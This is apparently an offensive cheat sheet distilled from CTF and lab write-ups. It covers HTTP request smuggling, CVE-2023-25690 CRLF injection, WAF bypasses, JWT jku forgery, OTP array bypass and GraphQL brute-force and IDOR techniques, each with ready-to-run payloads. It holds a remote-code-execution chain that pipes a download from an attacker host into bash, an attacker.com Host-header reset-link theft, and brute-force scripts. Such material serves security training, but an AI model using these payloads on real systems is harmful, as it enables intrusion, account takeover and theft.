# Writeup-Distilled Patterns W39–W48 — smuggle / WAF / JWT / GraphQL (R2)

## W39 — 0.CL / H2.CL / CL.0 desync with ERG staging
Signals: front ignores `Content-Length: 0` but back respects it (or H2 front downgrades to H1 back); static-asset endpoint responds fast; `User-Agent` reflected in victim page.
Steps: 1) Repeater confirm: `POST /` + `Content-Length: 0` + smuggled `GET /404` — unexpected 404 = desync; 2) pick fast ERG (`/resources/css/anything`); 3) Turbo Intruder queue ERG + smuggled XSS + victim `GET /`, `%s` length auto-calc.
```http
POST /resources/css/anything HTTP/1.1
Host: $HOST
Content-Length: 0

GET /post?postId=8 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Length: 5

x=1
```
Pitfalls: missing `\r\n\r\n` breaks parser boundary; slow ERG causes flaky queue — try 2-3 static paths; GET-with-body rejected — use `OPTIONS` shaper.
Sources: https://herish.me/blog/0cl-request-smuggling/ | https://www.aviskase.com/articles/2025/03/13/writeup-tryhackme-el-bandito/ | https://siunam321.github.io/ctf/portswigger-labs/HTTP-Request-Smuggling/smuggling-1/

## W40 — WebSocket-smuggle via SSRF 101 / 426 upgrade
Signals: `/check-url?server=` or `/isOnline?url=` SSRF; app uses WebSockets (`services.html`); proxy tunnels after upgrade without checking status.
Steps: 1) host server returning `101 Switching Protocols`; 2) `GET /check-url?server=http://$OOB:5555` + `Sec-WebSocket-Version: 13` + `Upgrade: websocket` + smuggled `GET /flag`; 3) proxy tunnels, back parses smuggled HTTP.
```http
GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: $HOST
Sec-WebSocket-Version: 13
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: $HOST
```
Pitfalls: Nginx checks response code — need fake 101 via SSRF, not invalid-version 426; Spring/Nginx drop non-101 — confirm SSRF reflect first.
Sources: https://blog.devgenius.io/tryhackme-request-smuggling-websockets-write-up-84230734c0f5 | https://medium.com/@karma55/el-bandito-smuggling-fe829ad182a0 | https://0xsapra.gitbook.io/web/writeups/request-smuggling-n-day-vibe.d

## W41 — Apache mod_proxy CVE-2023-25690 CRLF smuggle
Signals: Apache 2.4.0-2.4.55 + `mod_proxy` + `RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]`; `RequestHeader unset A/a` hints header-strip bypass.
Steps: 1) `GET /name/%0D%0Aa:%20admin%0D%0Aabc:%20edf` — backend receives `a: admin`; 2) for RCE chain: `GET /page/%20HTTP/1.1%0D%0A...%0D%0APOST%20/gen.php...length=;curl$IFS$OOB|bash;` + trailing `GET /test` absorber.
```bash
curl --path-as-is "http://$HOST/page/%20HTTP/1.1%0D%0AHost:%20x%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20x%0D%0AContent-Length:%2031%0D%0A%0D%0Alength=;curl$OOB|bash;%0D%0A%0D%0AGET%20/test"
```
Pitfalls: double-encode dies at first decode — use single `%0D%0A`; proxy appends headers — trailing absorber `GET /test` required.
Sources: https://dudenation.github.io/posts/byu-ctf/ | https://systemweakness.com/tryhackme-contrabando-room-write-up-ctf-cve-2023-25690-ssrf-ssti-scenario-44743b3baa8a | https://siunam321.github.io/ctf/portswigger-labs/HTTP-Request-Smuggling/smuggling-10/

## W42 — WAF PCRE resource-exhaustion (pattern flooding)
Signals: PHP `preg_match` sequential regex (`/('|")/`, `/(or|and)/i`, `/\s/`), no length/rate limit, boolean login oracle (302 = success).
Steps: 1) prefix `383838*'"' + 383838*'or' + 383838*'union'` to trip PCRE limits (`preg_match` returns FALSE = pass); 2) append `'or(if((select(flag)from(flags))like('PREFIX%'),1,2)=1)#`; 3) brute hex charset via 302.
```python
prefix = 383838*'"' + 383838*'or' + 383838*'union'
inj = prefix + f"'or(if((select(flag)from(flags))like('{known}{c}%'),1,2)=1)#"
r = requests.post(URL, data={'username': inj, 'password': 'x'}, allow_redirects=False)
ok = (r.status_code == 302)
```
Pitfalls: prefix too short still matches — scale to 300k+ reps; `/**/` blocked separately — use plain `or` flood, not comments.
Sources: https://0xmshal.medium.com/koko-waf-web-challenge-writeup-0379f0689408 | https://writeups.cyscomvit.com/writeups/CyberConverge_2025/19-polyglot.html | https://cn-sec.com/archives/1903187.html

## W43 — Multipart / Content-Type parser-differential WAF bypass
Signals: Go/Python WAF proxy + backend service; `regexp.MustCompile(union.*select)` + `rcePattern`; multipart article on bypass known; `admin` gated.
Steps: 1) send SAME payload as `application/json` (blocked) vs `multipart/form-data` (passes) — keep executing parse; 2) quine UNION for `admin` gate; 3) sqlmap with alternate `User-Agent` if needed.
```bash
curl -sS -X POST $URL/api -H 'Content-Type: multipart/form-data; boundary=----x' --data-binary $'------x\r\nContent-Disposition: form-data; name="id"\r\n\r\n1\x27 UNION SELECT 1,2-- -\r\n------x--\r\n'
curl -sS -A 'Mozilla/5.0' "$URL?id=1%27%20UNION%20SELECT%201,2--%20-"
```
Pitfalls: backend may only parse one type — diff which executes, drop others; boundary typo = whole body ignored.
Sources: https://blog.0xfff.team/posts/tpctf_2025_writeup/ | https://luo-kaihong.github.io/p/2025-ciscn%E5%88%9D%E8%B5%9B/ | https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-1/

## W44 — JWT `jku` + open-redirect prefix bypass
Signals: `{"alg":"RS256","jku":"http://127.0.0.1:1337/...","kid":"..."}` + `if (!jku.startsWith('http://127.0.0.1:1337/')) throw`; `/api/analytics/redirect?url=&ref=` open redirect present.
Steps: 1) generate RSA pair, host `jwks.json`; 2) set `jku=http://127.0.0.1:1337/api/analytics/redirect?ref=w&url=https://$OOB/jwks.json` (passes prefix, 302s out); 3) forge `{"email":"financial-controller"}` + sign, replay.
```bash
openssl genrsa -out key.pem 2048
python3 -c "from jwcrypto import jwk; k=jwk.JWK.generate(kty='RSA',size=2048,kid='K'); print(k.export_public())" > jwks.json
python3 jwt_tool.py $JWT -S rs256 -pr key.pem -I -hc jku -hv "http://127.0.0.1:1337/api/analytics/redirect?ref=w&url=https://$OOB/jwks.json"
```
Pitfalls: `@`-trick fails trailing-slash check — must use path-redirect, not userinfo; `kid` must match hosted JWK `kid`.
Sources: https://lucashanson.fr/writeups/breaking_bank/ | https://deltabluejay.me/posts/Breaking-Bank/ | https://yun.ng/c/ctf/2024-htb-university-ctf/web/breaking-bank

## W45 — JWT `jku` + Host-header poisoning
Signals: `jku` built from `Host` (`http://$host/jkus.json`); `/forgot-password` builds `http://$host/reset...`; `temp_token` accesses `/admin/2fa-setup`.
Steps: 1) `POST /forgot-password Host: attacker.com` — steal reset link; 2) host `jkus.json` with own RSA; 3) forge `{"username":"admin"}` with `jku=http://attacker.com/jkus.json`, send with `Host: attacker.com`.
```bash
curl -sS -X POST $URL/forgot-password -H 'Host: attacker.com' -d 'email=admin@x.y'
curl -sS $URL/flag -H 'Host: attacker.com' --cookie "token=$FORGED"
```
Pitfalls: HTTPS vs HTTP mismatch breaks fetch — match scheme; `kid` must equal hosted `kid`.
Sources: https://0xnayel.com/publications/cat-ctf-25-web-writeups | https://medium.com/@mostafakhalifal/ascwg-ctf-2025-qualifications-web-challenge-official-solution-redirect-havoc-705071177a4d | https://siunam321.github.io/ctf/portswigger-labs/JWT/jwt-1/

## W46 — OTP `includes()` array bypass
Signals: `{"to":"x","coin":"CLCR","amount":N,"otp":["1"]}` + `if (!otp.includes(validOtp)) 401`; OTP emailed, unknown.
Steps: 1) after jku forge + drain-setup, send `otp` as full range `["1000",...,"9999"]` (or de Bruijn `de_bruijn('0123456789',4)`); 2) one alias matches → `includes` true; 3) `GET /dashboard` for flag.
```json
{"to":"friend@x.y","coin":"CLCR","amount":26437319954,"otp":["1000","1001","1002"]}
```
Pitfalls: JSON array vs string type matters — send array, not CSV; too many entries = 413 — batch 2k/request.
Sources: https://lucashanson.fr/writeups/breaking_bank/ | https://deltabluejay.me/posts/Breaking-Bank/ | https://yun.ng/c/ctf/2024-htb-university-ctf/web/breaking-bank

## W47 — GraphQL mega-batching (10k aliases) + OTP/DoS
Signals: `guessNumber(number:)` or `login(input:)` GraphQL, per-HTTP (not per-op) rate limit, `correct/message/flag` fields.
Steps: 1) build `query { n1: guessNumber(number:1){correct message flag} ... n10000: ... }` (10k/batch); 2) POST once, scan `correct==true`; 3) sleep 10s between batches to dodge lockout.
```python
q = "query { " + "\n".join(f'n{i}: guessNumber(number:{i}) {{correct message flag}}' for i in range(s, s+10000)) + " }"
r = requests.post(URL, json={"query": q})
for k,v in r.json().get("data",{}).items():
    if v and v.get("correct"): print(k, v.get("flag")); break
```
Pitfalls: introspection may hide field — fuzz via suggestions; >10k aliases = 413 — cap 10k.
Sources: https://bluecyber.hashnode.dev/bsides-mumbai-2025-web-operation-overflow | https://mohammadibnibrahim.medium.com/hack-the-system-speednet-6ff20a6c06a2 | https://medium.com/infosecmatrix/19-3-lab-bypassing-graphql-brute-force-protections-2024-ae9df787c7c7

## W48 — GraphQL field-suggestion IDOR (introspection off)
Signals: `{"errors":[{"message":"Did you mean ..."}]}` on bad field; `__schema` blocked but `__typename` works; b64 `Type:id` hints.
Steps: 1) typo field to leak suggestions (`{"query":"{ prodcts { id } }"}` → `Did you mean products?`); 2) rebuild query from suggestions; 3) `node(id: forged-b64)` + `X-Forwarded-For: 127.0.0.1` if staff-gated.
```bash
curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{"query":"{ prodcts { id } }"}' | grep -o 'Did you mean[^"]*'
curl -sS -X POST $URL/graphql -H 'Content-Type: application/json' -d '{"query":"{ node(id:\"QWRtaW46MQ==\"){__typename} }"}'
```
Pitfalls: suggestions rate-limited — batch 5 typos/req; type-name guess is crux — use `about`/error text.
Sources: https://www.offensiveweb.com/docs/server-side/graphql/ | https://siunam321.github.io/ctf/portswigger-labs/Testing-GraphQL-APIs/graphql-1/ | https://juangrate.cc/writeups/graphql/bypassing-graphql-brute-force-protections/
